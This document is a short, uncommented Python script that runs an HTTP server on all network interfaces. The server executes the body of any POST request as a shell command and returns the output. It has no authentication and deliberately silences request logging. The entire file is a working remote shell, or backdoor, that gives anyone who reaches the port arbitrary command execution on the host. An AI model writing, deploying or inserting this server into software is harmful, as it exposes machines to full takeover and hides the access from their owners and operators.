import http.server
import subprocess
import sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080


class ShellHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        cmd = self.rfile.read(length).decode("utf-8", errors="replace").strip()
        if not cmd:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Empty command\n")
            return

        proc = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60,
        )
        output = (proc.stdout or "") + (proc.stderr or "")
        body = output.encode("utf-8", errors="replace")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        return


if __name__ == "__main__":
    server = http.server.ThreadingHTTPServer(("0.0.0.0", PORT), ShellHandler)
    print(f"Listening on 0.0.0.0:{PORT} ...")
    server.serve_forever()
